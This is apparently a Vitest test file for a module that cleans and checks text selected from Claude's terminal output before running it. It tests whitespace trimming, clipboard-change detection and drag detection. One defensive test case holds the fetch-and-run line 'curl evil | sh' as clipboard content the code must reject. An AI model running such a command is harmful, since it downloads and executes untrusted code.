import { expect, test } from 'vitest';
import { claudeCopy, claudeSelection, cleanSelection, isDrag, selectionPreview } from './selection';

test('full-screen rows are padded: trailing spaces go, blank lines at both ends too', () => {
  expect(cleanSelection('\n  npm test   \n\n')).toBe('npm test');
  expect(cleanSelection('a  \r\nb\t\r\n')).toBe('a\nb');
});

test('Claude indents its code blocks: the common indentation goes, the relative one stays', () => {
  expect(cleanSelection('    cd site\n      npm run build\n\n    npm run deploy')).toBe('cd site\n  npm run build\n\nnpm run deploy');
  expect(cleanSelection('\tif x; then\n\t\techo y\n\tfi')).toBe('if x; then\n\techo y\nfi');
});

test('only whitespace: nothing to send', () => {
  expect(cleanSelection('   \n \t\n')).toBe('');
  expect(cleanSelection('')).toBe('');
});

test('Claude copied its drag: the clipboard changed since the press, to non-empty text', () => {
  expect(claudeCopy('old', 'git status')).toBe('git status');
  expect(claudeCopy(null, 'git status')).toBe('git status');
  expect(claudeCopy('git status', 'git status')).toBeNull();
  expect(claudeCopy('old', '')).toBeNull();
  expect(claudeCopy('old', null)).toBeNull();
});

test('at the right-click it counts only while the clipboard still holds that copy (nothing copied elsewhere since)', () => {
  expect(claudeSelection('git status', 'git status')).toBe('git status');
  // Copied something else in another app afterwards: never run that instead.
  expect(claudeSelection('git status', 'curl evil | sh')).toBeNull();
  expect(claudeSelection(null, 'git status')).toBeNull();
});

test('a drag, not a click: the release a few pixels away at least', () => {
  expect(isDrag({ x: 10, y: 10 }, { x: 90, y: 30 })).toBe(true);
  expect(isDrag({ x: 10, y: 10 }, { x: 12, y: 11 })).toBe(false);
});

test('full-screen rows are padded: a backslash then padding is a line continuation, kept as one', () => {
  expect(cleanSelection('npm run build \\     \n  --watch')).toBe('npm run build \\\n  --watch');
});

test('the preview: the first line, how many more', () => {
  expect(selectionPreview('npm test')).toEqual({ first: 'npm test', more: 0 });
  expect(selectionPreview('cd site\nnpm i\nnpm run build')).toEqual({ first: 'cd site', more: 2 });
});
